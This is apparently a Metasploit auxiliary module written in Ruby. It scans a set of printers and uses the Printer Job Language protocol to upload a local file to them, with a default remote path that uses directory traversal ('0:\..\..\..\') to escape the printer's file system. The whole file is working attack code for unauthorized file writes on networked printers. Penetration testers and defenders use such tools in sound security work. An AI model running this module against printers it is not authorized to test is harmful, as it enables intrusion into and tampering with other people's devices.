##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require "rex/proto/pjl"

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      "Name" => "Printer File Upload Scanner",
      "Description" => %q{
        This module uploads a file to a set of printers using the
        Printer Job Language (PJL) protocol.
      },
      "Author" => [
        "wvu", # Rex::Proto::PJL and modules
        "sinn3r", # RSpec tests
        "MC", # Independent mixin and modules
        "Myo Soe", # Independent modules
        "Matteo Cantoni <goony[at]nothink.org>" # Independent modules
      ],
      "References" => [
        ["URL", "https://en.wikipedia.org/wiki/Printer_Job_Language"]
      ],
      "License" => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(Rex::Proto::PJL::DEFAULT_PORT),
      OptPath.new("LPATH", [true, "Local path",
        File.join(Msf::Config.data_directory, "eicar.com")]),
      OptString.new("RPATH", [true, "Remote path", '0:\..\..\..\eicar.com'])
    ])
  end

  def run_host(ip)
    lpath = datastore["LPATH"]
    rpath = datastore["RPATH"]

    connect
    pjl = Rex::Proto::PJL::Client.new(sock)
    pjl.begin_job

    pjl.fsinit(rpath[0..1])

    if pjl.fsdownload(lpath, rpath)
      print_good("#{rhost}:#{rport} - Saved #{lpath} to #{rpath}")
    end

    pjl.end_job
    disconnect
  end
end
